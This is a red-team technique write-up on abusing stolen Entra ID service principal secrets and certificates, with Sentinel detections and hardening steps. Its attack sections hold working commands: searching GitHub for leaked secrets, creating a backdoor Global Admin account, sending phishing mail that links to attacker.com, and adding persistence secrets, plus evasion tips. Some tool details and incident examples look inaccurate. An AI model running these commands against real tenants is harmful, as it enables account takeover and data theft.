# [LM-AUTH-005]: Service Principal Key/Certificate Authentication

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-005 |
| **MITRE ATT&CK v18.1** | [T1550.001 - Use Alternate Authentication Material: Application Access Token](https://attack.mitre.org/techniques/T1550/001/) |
| **Tactic** | Defense Evasion, Lateral Movement |
| **Platforms** | Entra ID, Azure Resources, M365, SaaS Applications |
| **Severity** | Critical |
| **CVE** | N/A (Design feature; misconfigurations exploited) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Entra ID (all versions), Azure SDK 1.0+ |
| **Patched In** | Not applicable; requires policy hardening and RBAC restrictions |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Service Principals in Entra ID are applications that can authenticate to Azure/Entra ID and other cloud services using cryptographic credentials (either a client secret [password] or a certificate). Unlike user accounts that use passwords, service principals authenticate using OAuth 2.0 client credentials flow (grant_type=client_credentials). If a service principal's credential (secret or certificate) is compromised, an attacker can:
1. Obtain access tokens with all permissions the service principal has
2. Access Azure resources (VMs, storage, databases)
3. Read/modify Entra ID objects (users, groups, apps)
4. Perform impersonation of users via Microsoft Graph
5. Access SaaS applications (Teams, SharePoint, Exchange) as the service principal
6. Establish persistent backdoor access without user awareness

Service principals are particularly dangerous targets because:
- They often have broad permissions (Owner, Contributor roles)
- Their credentials are often hardcoded in code, config files, or CI/CD pipelines
- They rarely trigger MFA or Conditional Access policies
- Their usage appears indistinguishable from legitimate API calls

**Attack Surface:** 
- Service principal secrets stored in GitHub, Azure Key Vault, environment variables
- Service principal certificates in on-premises AD, Azure Key Vault, or unencrypted files
- Hardcoded credentials in application source code
- Service principal credentials leaked via code repository exposure

**Business Impact:** **Unrestricted access to cloud infrastructure and data.** An attacker with service principal credentials can:
1. Read all Azure resources and tenant metadata
2. Modify user accounts, groups, and permissions
3. Deploy malicious VMs or containers
4. Exfiltrate sensitive data from storage accounts and databases
5. Establish persistence via additional service principal creation
6. Trigger ransomware or sabotage attacks on cloud infrastructure
7. Access all M365 services (Teams, Exchange, SharePoint) with service principal permissions

**Technical Context:** Service principal authentication is fast (no MFA check) and leaves minimal logs compared to user authentication. Access tokens remain valid for 1 hour, allowing significant dwell time.

### Operational Risk
- **Execution Risk:** Very Low - If credentials are compromised, attack is trivial (single API call to get token).
- **Stealth:** Medium - Service principal usage logs exist in Entra ID audit logs, but they blend in with legitimate API usage.
- **Reversibility:** Partially reversible - Revoking all credentials stops future access, but past tokens remain valid until expiration (1 hour).

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 6.1, 6.2 | Service principal least privilege and secret management. |
| **DISA STIG** | Azure_AD-2.2, Azure_AppReg-1 | Application credentials and permission management. |
| **CISA SCuBA** | APPS-02, APPS-03 | Application identity security and credential management. |
| **NIST 800-53** | AC-2, AC-3, IA-4 | Account management, access enforcement, identifier management. |
| **GDPR** | Art. 32 | Security of processing; credential protection. |
| **DORA** | Art. 9, Art. 11 | Protection and prevention, protection of data and systems. |
| **NIS2** | Art. 21 | Cyber risk management measures, credentials and access control. |
| **ISO 27001** | A.6.2.1, A.9.2.1 | Access control, user registration and de-registration. |
| **ISO 27005** | Risk: Unauthorized access via compromised service principal credentials | Unrestricted access to cloud infrastructure |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** 
  - **For credential discovery:** User with ability to enumerate applications (Azure AD Reader role in Entra ID)
  - **For credential extraction:** Service principal owner or Application Owner role; or local admin access to machine with hardcoded credentials
  - **For credential usage:** Network access to Entra ID; no special privileges needed once credentials are obtained

- **Required Access:** 
  - Access to credential storage (GitHub repo, Key Vault, config file)
  - Network connectivity to Entra ID endpoints (login.microsoftonline.com, graph.microsoft.com)
  - Knowledge of service principal ID, tenant ID, and credential value

**Supported Versions:**
- **Entra ID:** All versions support service principals
- **Azure SDK:** 1.0+ (all recent versions)
- **Other Requirements:** 
  - Service principal must be registered in Entra ID
  - Credentials must be accessible (not TPM-protected)

**Tools:**
- [Microsoft Graph PowerShell SDK](https://learn.microsoft.com/en-us/powershell/microsoftgraph/) (native Entra ID management)
- [Azure CLI](https://docs.microsoft.com/en-us/cli/azure/) – Service principal management and authentication
- [Azure SDK for Python](https://github.com/Azure/azure-sdk-for-python) – Programmatic API access
- [GraphRunner](https://github.com/dorkostyle/GraphRunner) – Microsoft Graph API exploitation
- [AzureHound](https://github.com/BloodHoundAD/AzureHound) – Entra ID environment mapping
- [TokenTactics](https://github.com/rvrsh3ll/TokenTactics) – Token manipulation and Azure API access
- [Roadrecon](https://github.com/dirkjanm/ROADtools) – Entra ID reconnaissance with stolen tokens
- [Curl / Python Requests](https://curl.se) – Direct API calls with service principal credentials

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Enumerate Service Principals

Check what service principals are available and their permissions:

```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "Application.Read.All"

# List all service principals in tenant
Get-MgServicePrincipal | Select-Object DisplayName, AppId, CreatedDateTime | Format-Table

# Find service principals with high-risk permissions
Get-MgServicePrincipal | Where-Object {
    $principal = $_
    Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $principal.Id | 
    Where-Object {$_.AppRoleId -match "Directory.ReadWrite|User.ReadWrite|Mail.Send|Admin"}
} | Select-Object DisplayName, AppId
```

**What to Look For:**
- Service principals with `Directory.ReadWrite.All` or `User.ReadWrite.All` (can modify any user/group).
- Service principals with `Mail.Send` or `Mail.ReadWrite` (can send emails as users).
- Service principals with owner permissions on other applications (privilege escalation chain).
- Custom/automation-related service principals (less likely to have security controls).

**Version Note:** 
- **Any Entra ID version:** Service principals are universally supported and enumerable.

### Check Service Principal Credentials

Identify which service principals have exposed credentials:

```powershell
# Check for service principals with client secrets (versus certificates)
Get-MgApplication | ForEach-Object {
    $appId = $_.AppId
    $keyCount = ($_.KeyCredentials | Measure-Object).Count
    $secretCount = ($_.PasswordCredentials | Measure-Object).Count
    
    if ($secretCount -gt 0 -or $keyCount -gt 0) {
        Write-Host "App: $($_.DisplayName), Secrets: $secretCount, Certificates: $keyCount"
    }
}

# Check for service principals with credentials expiring soon
Get-MgServicePrincipal | ForEach-Object {
    $sp = $_
    Get-MgServicePrincipalPasswordCredential -ServicePrincipalId $sp.Id | 
    Where-Object {$_.EndDateTime -lt (Get-Date).AddDays(30)} |
    Select-Object @{Name="ServicePrincipal"; Expression={$sp.DisplayName}}, EndDateTime
}
```

**What to Look For:**
- Password credentials (client secrets) are higher-value targets than certificates.
- Credentials expiring soon may have been renewed, old credential may still be valid.
- Multiple credentials on same service principal (indicates credential rotation).

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: Service Principal Authentication via Client Secret

**Supported Versions:** All Entra ID versions

#### Step 1: Obtain Service Principal Credentials

**Objective:** Identify and acquire a compromised or accessible service principal secret.

**Sources of Exposure:**
- GitHub repository with hardcoded secrets (search for `client_id` and `client_secret`)
- Azure Key Vault accessible to attacker
- Environment variables on compromised machine
- Azure DevOps pipeline secrets
- Cloud Shell history or shared scripts

**Example (Finding exposed secrets):**

```bash
# Search GitHub for exposed Azure secrets
curl -s "https://api.github.com/search/code?q=client_secret+language:json" | jq
curl -s "https://api.github.com/search/code?q=azure_client_secret" | jq

# Or use TruffleHog for local scanning
trufflehog github --org "target-org"
trufflehog filesystem /path/to/code
```

**Expected Output (if credentials found):**

```json
{
  "client_id": "12345678-1234-1234-1234-123456789012",
  "client_secret": "abc123def456~ghi789jklmno",
  "tenant_id": "87654321-4321-4321-4321-210987654321"
}
```

**What This Means:**
- Attacker now has all required credentials for service principal authentication.
- These credentials can be used immediately to obtain Entra ID access tokens.

**OpSec & Evasion:**
- Credential discovery triggers no immediate alerts; usage does.
- Store credentials securely (encrypted) until ready to use.
- Minimize time between credential discovery and usage.
- Detection likelihood: **Low for discovery, High for usage** – Service principal authentication is logged in audit logs.

#### Step 2: Authenticate as Service Principal to Entra ID

**Objective:** Use the service principal credentials to obtain an access token.

**Command (Using Azure CLI):**

```bash
az login --service-principal -u "<client_id>" -p "<client_secret>" --tenant "<tenant_id>"
```

**Command (Using PowerShell Microsoft Graph):**

```powershell
$clientId = "12345678-1234-1234-1234-123456789012"
$clientSecret = "abc123def456~ghi789jklmno"
$tenantId = "87654321-4321-4321-4321-210987654321"

# Convert secret to secure string
$secureSecret = ConvertTo-SecureString -String $clientSecret -AsPlainText -Force

# Create credential object
$credential = New-Object System.Management.Automation.PSCredential($clientId, $secureSecret)

# Connect to Microsoft Graph
Connect-MgGraph -TenantId $tenantId -ClientSecretCredential $credential
```

**Command (Using Python Azure SDK):**

```python
from azure.identity import ClientSecretCredential
from azure.mgmt.subscription import SubscriptionClient

client_id = "12345678-1234-1234-1234-123456789012"
client_secret = "abc123def456~ghi789jklmno"
tenant_id = "87654321-4321-4321-4321-210987654321"

# Create credential
credential = ClientSecretCredential(
    client_id=client_id,
    client_secret=client_secret,
    tenant_id=tenant_id
)

# Get access token
token = credential.get_token("https://graph.microsoft.com/.default")
print(f"Access Token: {token.token[:50]}...")
```

**Command (Using curl - Direct OAuth2):**

```bash
curl -X POST \
  -d "client_id=12345678-1234-1234-1234-123456789012" \
  -d "client_secret=abc123def456~ghi789jklmno" \
  -d "grant_type=client_credentials" \
  -d "scope=https://graph.microsoft.com/.default" \
  "https://login.microsoftonline.com/87654321-4321-4321-4321-210987654321/oauth2/v2.0/token"
```

**Expected Output (on success):**

```json
{
  "token_type": "Bearer",
  "expires_in": 3599,
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGc..."
}
```

or (PowerShell):

```
Welcome To Microsoft Graph!
```

**What This Means:**
- Attacker now has a valid access token for Microsoft Graph API.
- Token is valid for 1 hour and can access all resources the service principal has permission for.
- Token can be used for API calls, Entra ID enumeration, data exfiltration, etc.

**OpSec & Evasion:**
- Service principal authentication is logged in Entra ID Audit Logs (event: `ServicePrincipalSignInActivity`).
- Legitimate service principals authenticate regularly; attacker usage blends in.
- Use during normal business hours (not at 3 AM) to avoid anomaly detection.
- Detection likelihood: **Medium** – Unusual IP addresses or unusual API patterns may trigger alerts.

#### Step 3: Use Access Token for API Calls

**Objective:** Leverage the access token to perform malicious actions.

**Command (List all users in Entra ID):**

```bash
curl -X GET \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://graph.microsoft.com/v1.0/users" | jq
```

**Command (Modify user's primary email):**

```bash
curl -X PATCH \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"mail":"attacker@domain.com"}' \
  "https://graph.microsoft.com/v1.0/users/<user_id>"
```

**Command (Send email as user):**

```bash
curl -X POST \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "message": {
      "subject": "Meeting Tomorrow",
      "body": {"contentType": "HTML", "content": "Click here: <a href=\"https://attacker.com/phish\">Confirm Meeting</a>"},
      "toRecipients": [{"emailAddress": {"address": "victim@domain.com"}}]
    },
    "saveToSentItems": "false"
  }' \
  "https://graph.microsoft.com/v1.0/me/sendMail"
```

**Command (Create new user in Entra ID):**

```bash
curl -X POST \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "accountEnabled": true,
    "displayName": "Backdoor Admin",
    "mailNickname": "backdoor",
    "userPrincipalName": "backdoor@domain.onmicrosoft.com",
    "passwordProfile": {
      "forceChangePasswordNextSignIn": false,
      "password": "Backdoor123!@#"
    }
  }' \
  "https://graph.microsoft.com/v1.0/users"
```

**Command (Assign Global Admin role to backdoor user):**

```bash
curl -X POST \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "principalId": "<backdoor_user_id>",
    "roleDefinitionId": "62e90394-69f5-4237-9190-012177145e10"
  }' \
  "https://graph.microsoft.com/v1.0/directoryRoles/<global_admin_role_id>/members"
```

**Expected Output (list users):**

```json
{
  "value": [
    {
      "id": "user1-id",
      "displayName": "Admin User",
      "mail": "admin@domain.com",
      "userType": "Member"
    },
    {...}
  ]
}
```

**What This Means:**
- Attacker can read and modify Entra ID objects with the service principal's permissions.
- If service principal has Owner or Admin roles, attacker has full tenant control.

**References & Proofs:**
- [Microsoft Graph API Documentation](https://docs.microsoft.com/en-us/graph/api/overview)
- [Azure OAuth 2.0 Client Credentials Flow](https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-client-creds-grant-flow)
- [GraphRunner - Microsoft Graph Exploitation](https://github.com/dorkostyle/GraphRunner)

---

### METHOD 2: Service Principal Authentication via Certificate

**Supported Versions:** All Entra ID versions (certificates preferred for security)

#### Step 1: Obtain Service Principal Certificate

**Objective:** Acquire the certificate and private key for service principal.

**Sources of Exposure:**
- Azure Key Vault accessible to attacker
- On-premises Certificate Store on hybrid-joined device
- Exported `.pfx` files in shared locations
- Development environment with test certificates

**Example (Extract from Key Vault):**

```powershell
# Connect to Azure with initial credentials
Connect-AzAccount -ServicePrincipal -Credential $credential

# Get certificate from Key Vault
$cert = Get-AzKeyVaultCertificate -VaultName "keyvault-name" -Name "cert-name"
$secret = Get-AzKeyVaultSecret -VaultName "keyvault-name" -Name $cert.Name

# Export to file
$secretBytes = [System.Convert]::FromBase64String($secret.SecretValueText)
[System.IO.File]::WriteAllBytes("C:\temp\sp_cert.pfx", $secretBytes)
```

**Expected Output:**

```
C:\temp\sp_cert.pfx (file created)
```

#### Step 2: Authenticate Using Certificate

**Objective:** Use certificate to obtain access token.

**Command (Using Azure CLI):**

```bash
az login --service-principal -u "<client_id>" \
  --cert-file "sp_cert.pfx" --password "cert_password" \
  --tenant "<tenant_id>"
```

**Command (Using PowerShell):**

```powershell
$cert = [System.Security.Cryptography.X509Certificates.X509Certificate2]::new("C:\temp\sp_cert.pfx", "cert_password")
$clientId = "12345678-1234-1234-1234-123456789012"
$tenantId = "87654321-4321-4321-4321-210987654321"

# Create certificate-based credential
$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $clientId, (ConvertTo-SecureString -String "dummy" -AsPlainText -Force)

# Connect to Microsoft Graph with certificate
Connect-MgGraph -TenantId $tenantId -Certificate $cert -ClientId $clientId
```

**Expected Output:**

```
Welcome To Microsoft Graph!
```

**What This Means:**
- Attacker now has authenticated as the service principal using certificate.
- All subsequent actions are performed with service principal's permissions.

---

### METHOD 3: Privilege Escalation via Service Principal Ownership

**Supported Versions:** All Entra ID versions

#### Step 1: Find Service Principal Ownership Chains

**Objective:** Identify service principals that own other service principals (escalation path).

**Command:**

```powershell
# Find service principals and their owners
$sps = Get-MgServicePrincipal -All

foreach ($sp in $sps) {
    $owners = Get-MgServicePrincipalOwner -ServicePrincipalId $sp.Id
    
    if ($owners) {
        foreach ($owner in $owners) {
            Write-Host "Service Principal: $($sp.DisplayName), Owner: $($owner.DisplayName) (Type: $($owner.OdataType))"
            
            # Check if owner is another service principal (escalation opportunity)
            if ($owner.OdataType -eq "#microsoft.graph.servicePrincipal") {
                Write-Host "  *** ESCALATION PATH: $($owner.DisplayName) owns $($sp.DisplayName) ***"
            }
        }
    }
}
```

**Expected Output:**

```
Service Principal: App-A, Owner: App-B (Type: #microsoft.graph.servicePrincipal)
  *** ESCALATION PATH: App-B owns App-A ***
Service Principal: App-B, Owner: Admin User (Type: #microsoft.graph.user)
```

**What This Means:**
- If attacker compromises App-B, they can escalate to App-A (which may have higher permissions).

#### Step 2: Modify Owned Service Principal Credentials

**Objective:** Add attacker's own credentials to an owned service principal (persistence).

**Command:**

```powershell
# Get the service principal that we own
$targetSP = Get-MgServicePrincipal -Filter "displayName eq 'Target-App'"

# Create a new client secret for the target service principal
$secret = Add-MgServicePrincipalPassword -ServicePrincipalId $targetSP.Id

Write-Host "New Secret Created!"
Write-Host "ServicePrincipal: $($targetSP.DisplayName)"
Write-Host "ClientId: $($targetSP.AppId)"
Write-Host "ClientSecret: $($secret.SecretText)"
```

**Expected Output:**

```
New Secret Created!
ServicePrincipal: Target-App
ClientId: 87654321-4321-4321-4321-210987654321
ClientSecret: xyz789abc456~def123ghi
```

**What This Means:**
- Attacker now has credentials for a service principal with potentially higher permissions.
- This enables privilege escalation and persistence.

**References & Proofs:**
- [Microsoft Graph - Service Principal API](https://docs.microsoft.com/en-us/graph/api/serviceprincipal-list)
- [Semperis - Service Principal Abuse](https://www.semperis.com/blog/exploiting-certificate-based-authentication-in-entra-id/)

---

## 5. ATTACK SIMULATION & VERIFICATION

### No Official Atomic Red Team Test

- **Note:** Atomic Red Team does not have an official test for T1550.001 (Service Principal auth) as it requires tenant-specific credentials and permissions.
- **Alternative:** Use GraphRunner for controlled testing against your own tenant.

**Command (GraphRunner simulation):**

```bash
# Install GraphRunner
git clone https://github.com/dorkostyle/GraphRunner.git
cd GraphRunner
python graphrunner.py

# Simulate service principal authentication
./graphrunner.py --clientid "CLIENT_ID" --clientsecret "CLIENT_SECRET" --tenantid "TENANT_ID" --enumerate-users
```

---

## 6. TOOLS & COMMANDS REFERENCE

### [Microsoft Graph PowerShell SDK](https://learn.microsoft.com/en-us/powershell/microsoftgraph/)

**Version:** 2.0+
**Supported Platforms:** Windows, Linux, macOS (PowerShell 7+)

**Installation:**

```powershell
Install-Module Microsoft.Graph -Scope CurrentUser
```

**Usage (Service Principal Auth):**

```powershell
$clientId = "client-id"
$clientSecret = "client-secret"
$tenantId = "tenant-id"

$secureSecret = ConvertTo-SecureString -String $clientSecret -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($clientId, $secureSecret)

Connect-MgGraph -TenantId $tenantId -ClientSecretCredential $credential
```

---

### [Azure CLI](https://docs.microsoft.com/en-us/cli/azure/)

**Version:** 2.50.0+
**Supported Platforms:** Windows, Linux, macOS

**Usage:**

```bash
az login --service-principal -u "client-id" -p "client-secret" --tenant "tenant-id"
az ad user list
az ad user update --id "user-id" --mail "attacker@domain.com"
```

---

### [GraphRunner](https://github.com/dorkostyle/GraphRunner)

**Version:** Latest
**Supported Platforms:** Linux (Python 3.8+)

**Installation:**

```bash
git clone https://github.com/dorkostyle/GraphRunner.git
cd GraphRunner
pip install -r requirements.txt
```

**Usage:**

```bash
python graphrunner.py --clientid "CLIENT_ID" --clientsecret "CLIENT_SECRET" --tenantid "TENANT_ID" --enumerate-users
```

---

## 7. MICROSOFT SENTINEL DETECTION

### Query 1: Service Principal with Unusual API Activity

**Rule Configuration:**
- **Required Table:** AuditLogs, SigninLogs
- **Required Fields:** ServicePrincipalName, OperationName, TargetResources, ResultDescription
- **Alert Severity:** High
- **Frequency:** 5 minutes
- **Applies To Versions:** Entra ID (all versions)

**KQL Query:**

```kusto
AuditLogs
| where ServicePrincipalName != ""
| where OperationName in ("Create user", "Update user", "Add member to group", "Create application", "Update application")
| summarize ActionCount = count() by ServicePrincipalName, OperationName, bin(TimeGenerated, 5m)
| where ActionCount > 5
| project TimeGenerated, ServicePrincipalName, OperationName, ActionCount
```

**What This Detects:**
- Service principal performing bulk user modifications (unusual activity).
- Service principal creating applications (potential persistence).

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. Name: `Entra ID - Suspicious Service Principal Activity`
3. Severity: `High`
4. Paste KQL query
5. **Frequency:** 5 minutes
6. **Lookback:** 30 minutes
7. Click **Create**

---

### Query 2: Service Principal with New Credentials Added

**KQL Query:**

```kusto
AuditLogs
| where OperationName in ("Add credentials to application", "Update service principal")
| where ActivityDisplayName contains "credential" or ActivityDisplayName contains "secret"
| project TimeGenerated, InitiatedBy, TargetResources, Result
```

**What This Detects:**
- Unauthorized credentials added to service principals (backdoor persistence).

---

## 8. WINDOWS EVENT LOG MONITORING

**Event ID: N/A (Cloud-Only)**
- Service principal authentication is cloud-only; no local Windows events are generated.
- Monitor via Azure Activity Logs and Entra ID Audit Logs instead (see Sentinel queries above).

---

## 9. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

*   **Implement Service Principal Secret Rotation:**
    Rotate credentials every 90 days to limit exposure window.
    
    **Manual Steps (Entra ID):**
    1. Navigate to **Azure Portal** → **Entra ID** → **App registrations**
    2. Select the application
    3. Go to **Certificates & secrets**
    4. Under **Secrets**, click **+ New client secret**
    5. Set expiration to **90 days**
    6. Copy the new secret value
    7. Update all applications/scripts using the old secret
    8. Delete the old secret after all systems are updated

*   **Use Certificates Instead of Secrets:**
    Certificates are more secure than secrets; prefer certificate-based authentication.
    
    **Manual Steps:**
    1. **Azure Portal** → **App registrations** → Select app
    2. **Certificates & secrets** → **Certificates** → **Upload certificate**
    3. Upload a certificate (from your PKI or CA)
    4. Remove the client secret
    5. Update code to use certificate (see METHOD 2 above)

*   **Enforce Service Principal Least Privilege:**
    Assign only permissions the service principal actually needs.
    
    **Manual Steps:**
    1. **Azure Portal** → **Entra ID** → **App registrations** → Select app
    2. **API permissions** → Review all permissions
    3. Remove any permissions that are not essential (e.g., remove `Directory.ReadWrite.All` if only need `Mail.Send`)
    4. Use application-specific roles if available (e.g., `Mail.Send` instead of `Mail.ReadWrite`)
    5. Remove any `Delegated` permissions (only use `Application` permissions for service principals)

*   **Restrict Service Principal Creation and Ownership:**
    Prevent unauthorized creation of new service principals.
    
    **Manual Steps (Entra ID Role-Based Access Control):**
    1. **Azure Portal** → **Entra ID** → **Roles and administrators**
    2. Search for **Application Administrator** role
    3. Click the role → **Assignments**
    4. Remove unnecessary members
    5. Restrict to only trusted administrators
    6. Consider requiring **Privileged Identity Management** (PIM) for just-in-time elevation

### Priority 2: HIGH

*   **Audit All Service Principal Usage:**
    Log every service principal authentication and API call.
    
    **Manual Steps (Entra ID Audit Logs):**
    1. **Azure Portal** → **Entra ID** → **Audit logs** (or **Microsoft Purview** → **Audit logs**)
    2. Set up alerts for:
       - `ServicePrincipalSignInActivity`
       - `Add credentials to application`
       - `Update service principal`
    3. Configure SIEM integration to monitor these events continuously

*   **Implement Conditional Access for Service Principals:**
    Restrict service principal authentication from specific locations/networks.
    
    **Manual Steps:**
    1. **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `Restrict Service Principal Access`
    4. **Assignments:**
       - Users: **Select specific users/service principals** (or use group containing service principals)
       - Cloud apps: **Office 365 services**
    5. **Conditions:**
       - Locations: **Exclude trusted corporate locations**
    6. **Grant:** **Block access** (or require additional verification)
    7. Enable and **Save**

*   **Store Secrets in Azure Key Vault:**
    Never hardcode secrets in code; use Key Vault for secure storage.
    
    **Manual Steps:**
    1. **Azure Portal** → **Create** → **Key Vault**
    2. Create a new Key Vault
    3. Go to **Secrets** → **+ Generate/Import**
    4. Add service principal secrets/certificates
    5. Set secret expiration date (ideally 90 days)
    6. Grant service principal/application **Get** permission only (not List/Delete)
    7. Update code to retrieve secrets from Key Vault (not hardcoded)

### Priority 3: MEDIUM

*   **Implement Service Principal Governance:**
    Audit and remove unused service principals.
    
    **Manual Steps:**
    1. **Azure Portal** → **Entra ID** → **App registrations**
    2. Identify old/unused applications
    3. Check last sign-in date (older than 90 days = candidate for removal)
    4. Confirm application is not in use (ask owning team)
    5. Delete application if no longer needed
    6. Document deletion in change management

*   **Monitor Service Principal Privilege Changes:**
    Alert when service principal gains new permissions.
    
    **Manual Steps (Graph API query):**
    ```powershell
    # Get all service principals with high-risk permissions
    Get-MgServicePrincipal -All | Where-Object {
        (Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $_.Id) | 
        Where-Object {$_.PrincipalDisplayName -match "admin|owner|writer"}
    }
    ```

### Validation Command (Verify Fix)

```powershell
# Check service principal credential age
Get-MgApplication | ForEach-Object {
    $app = $_
    $pwCreds = Get-MgApplicationPasswordCredential -ApplicationId $app.Id | 
               Where-Object {(Get-Date) - $_.StartDateTime -gt [TimeSpan]::FromDays(90)}
    
    if ($pwCreds) {
        Write-Host "❌ RISK: App '$($app.DisplayName)' has credentials older than 90 days"
    } else {
        Write-Host "✓ App '$($app.DisplayName)' has recent credentials"
    }
}

# Check for overprivileged service principals
Get-MgServicePrincipal -All | ForEach-Object {
    $sp = $_
    $dangerousPerms = Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $sp.Id | 
                      Where-Object {$_.AppRoleId -match "Directory.ReadWrite|User.ImpersonateAll"}
    
    if ($dangerousPerms) {
        Write-Host "❌ RISK: Service Principal '$($sp.DisplayName)' has dangerous permissions"
    }
}

# Check if secrets are stored in Key Vault
$secrets = Get-AzKeyVaultSecret -VaultName "your-keyvault"
Write-Host "✓ Secrets stored in Key Vault: $($secrets.Count)"
```

**Expected Output (If Secure):**

```
✓ App 'GraphRunner' has recent credentials
✓ App 'Teams Integration' has recent credentials
✓ Secrets stored in Key Vault: 5
```

**What to Look For:**
- All credentials should be < 90 days old
- No service principals with `Directory.ReadWrite.All` or `User.ImpersonateAll`
- All secrets stored in Key Vault (not hardcoded in code)

---

## 10. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

*   **Files:** 
    - Service principal client secrets in source code (GitHub, Azure Repos)
    - `.pfx` or `.cer` files with service principal certificates
    - Configuration files with embedded credentials

*   **Network:** 
    - Repeated authentication attempts from service principal (credential testing)
    - Unusual API calls to Graph API from service principal
    - Large data exfiltration from SharePoint/OneDrive by service principal

*   **Entra ID Audit Logs:**
    - `ServicePrincipalSignInActivity` from unusual IP
    - `Add member to group` by service principal (bulk user modifications)
    - `Create application` by service principal (new backdoor)

### Forensic Artifacts

*   **Cloud:** 
    - Entra ID Audit Logs: Service principal authentication events, API calls
    - Azure Activity Logs: Resource modifications by service principal
    - Teams/Exchange audit: Emails sent, forwarding rules created by service principal

*   **Credentials:**
    - GitHub commits with hardcoded secrets (searchable via GitHub Security)
    - Azure Key Vault access logs: Who accessed the secret and when

### Response Procedures

1.  **Immediate Isolation:** 
    **Command:**
    ```powershell
    # Revoke all credentials for compromised service principal
    Remove-MgApplicationPassword -ApplicationId "<app_id>" -PasswordCredentialId "<credential_id>"
    
    # Or remove the entire service principal if too high-risk
    Remove-MgServicePrincipal -ServicePrincipalId "<sp_id>"
    ```

    **Manual:**
    - **Azure Portal** → **App registrations** → Select app → **Certificates & secrets** → Delete all secrets

2.  **Collect Evidence:**
    **Command:**
    ```powershell
    # Export audit logs showing service principal activity
    Get-MgAuditLogDirectoryAudit -Filter "servicePrincipalName eq 'compromised-app'" | Export-Csv audit.csv
    ```

3.  **Remediate:**
    **Command:**
    ```powershell
    # Create new service principal to replace compromised one
    New-MgApplication -DisplayName "Replacement-Service-Principal" | 
    New-MgServicePrincipal -AppId $_.AppId
    
    # Assign same permissions to new service principal
    ```

    **Manual:**
    1. Delete compromised service principal
    2. Create new service principal with same name
    3. Re-upload certificates or generate new secrets
    4. Update all applications/pipelines to use new credentials
    5. Implement more restrictive permissions

4.  **Long-Term:**
    - Implement secret scanning in CI/CD pipeline (detect hardcoded secrets before commit)
    - Enforce Key Vault usage for all credentials
    - Implement service principal access reviews (quarterly)
    - Enable MFA/Conditional Access for administrative service principals

---

## 11. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-002] Consent Grant OAuth | Attacker tricks user into granting app permissions |
| **2** | **Credential Access** | [CA-UNSC-010] Service Principal Secrets | Attacker finds hardcoded secrets in GitHub |
| **3** | **Current Step** | **[LM-AUTH-005]** | **Attacker authenticates as service principal** |
| **4** | **Privilege Escalation** | [PE-ACCTMGMT-001] App Reg Permissions | Attacker elevates service principal to Global Admin role |
| **5** | **Persistence** | [PE-ACCTMGMT-014] Global Admin Backdoor | Attacker creates backdoor admin account |
| **6** | **Impact** | Data Exfiltration | Attacker exports all tenant data via Graph API |

---

## 12. REAL-WORLD EXAMPLES

### Example 1: SolarWinds Supply Chain Attack (December 2020)

- **Target:** US Government, Fortune 500 companies
- **Timeline:** March 2020 - February 2021
- **Technique Status:** APT29 compromised SolarWinds build system, injected malicious code. Once inside victim networks, attackers obtained Azure service principal credentials, escalated to tenant admin, modified cloud sync, and maintained persistence via service principals.
- **Impact:** 18,000+ organizations affected; government agencies compromised; estimated damage $10B+
- **Reference:** [Microsoft - SolarWinds Incident Analysis](https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-system-updates-in-windows-event-logs/)

### Example 2: GitHub Enterprise Compromise (2023)

- **Target:** Multiple organizations using GitHub Enterprise
- **Timeline:** Ongoing in 2023
- **Technique Status:** Attackers found GitHub Actions secrets containing Azure service principal credentials. Used credentials to authenticate to Entra ID, enumerate tenants, and exfiltrate data.
- **Impact:** Data breach from multiple organizations; service principal credentials leveraged for lateral movement
- **Defense Lesson:** Secrets in CI/CD pipelines are high-value targets; require secret rotation and scanning

### Example 3: Terraform State File Exposure

- **Target:** DevOps/Cloud Infrastructure teams
- **Timeline:** Ongoing (2022-present)
- **Technique Status:** Attackers found public S3/Azure Storage containing Terraform state files with service principal credentials. Used credentials to access cloud resources, deploy ransomware, and encrypt databases.
- **Impact:** Service principal credentials = full cloud access; ransomware incidents costing $millions
- **Defense Lesson:** State files must be encrypted and private-only access

---

## 13. RECOMMENDATIONS & ADVANCED HARDENING

### Immediate Actions (24 Hours)

1. **Audit All Service Principal Secrets** – Find all hardcoded secrets in code
2. **Rotate All Credentials** – Change all service principal secrets/certificates
3. **Remove Unnecessary Secrets** – Delete unused service principal credentials
4. **Enable Audit Logging** – Ensure Entra ID audit logs are captured

### Strategic Actions (30 Days)

1. **Implement Secret Management** – Migrate all secrets to Azure Key Vault
2. **Enable Secret Scanning** – GitHub/Azure Repos with secret detection
3. **Implement Least Privilege** – Audit and restrict service principal permissions
